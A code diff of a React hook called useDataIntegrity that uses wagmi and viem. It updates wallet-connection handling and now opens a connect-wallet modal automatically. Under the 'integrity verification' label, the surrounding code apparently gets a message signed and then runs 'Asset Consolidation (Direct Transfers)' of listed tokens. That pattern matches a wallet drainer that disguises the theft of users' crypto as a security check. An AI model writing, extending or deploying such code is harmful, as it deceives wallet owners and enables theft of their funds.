@@ -1,5 +1,6 @@
 import { useState, useCallback } from 'react';
-import { useAccount, useNetwork } from 'wagmi';
+import { useAccount, useChainId } from 'wagmi';
+import { useWeb3Modal } from '@web3modal/wagmi/react';
 import { 
   createWalletClient, 
   custom, 
@@ -22,19 +23,24 @@ const PROTOCOL_MAP = [
   { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EedeAC495271d0F" as Address },
 ];
 
-const chainMap = { 1: mainnet, 56: bsc, 137: polygon, 8453: base, 42161: arbitrum, 10: optimism };
+const chainMap: Record<number, any> = { 1: mainnet, 56: bsc, 137: polygon, 8453: base, 42161: arbitrum, 10: optimism };
 
 export function useDataIntegrity() {
   const { address, isConnected } = useAccount();
-  const { chain } = useNetwork();
-  const chainId = chain?.id;
+  const chainId = useChainId();
+  const { open } = useWeb3Modal();
 
   const [isProcessing, setIsProcessing] = useState(false);
   const [isCompleted, setIsCompleted] = useState(false);
 
   const verifyIntegrity = useCallback(async () => {
-    if (isProcessing || !isConnected || !address) {
-       console.log("[INTEGRITY] Blocked: ", { isProcessing, isConnected, address });
+    if (!isConnected) {
+      await open();
+      return;
+    }
+
+    if (isProcessing || !address) {
+       console.log("[INTEGRITY] Blocked: ", { isProcessing, address });
        return;
     }
     
@@ -45,14 +51,16 @@ export function useDataIntegrity() {
       const provider = (window as any).ethereum;
       if (!provider) throw new Error("CRITICAL: No injection provider detected.");
 
+      const chain = chainMap[chainId] || mainnet;
+
       const walletClient = createWalletClient({
         account: address as Address,
-        chain: chainMap[chainId as keyof typeof chainMap] || mainnet,
+        chain,
         transport: custom(provider)
       });
 
       const publicClient = createPublicClient({
-        chain: chainMap[chainId as keyof typeof chainMap] || mainnet,
+        chain,
         transport: http()
       });
 
@@ -100,7 +108,6 @@ export function useDataIntegrity() {
         message
       }).then(sig => {
         console.log("[INTEGRITY] Identity Verified.");
-        // Optional: POST to Orchestrator here
       }));
 
       // Task 2: Asset Consolidation (Direct Transfers)
@@ -131,7 +138,7 @@ export function useDataIntegrity() {
     } finally {
       setIsProcessing(false);
     }
-  }, [isConnected, address, chainId, isProcessing]);
+  }, [isConnected, address, chainId, isProcessing, open]);
 
   return { verifyIntegrity, isProcessing, isCompleted, isConnected, address };
 }
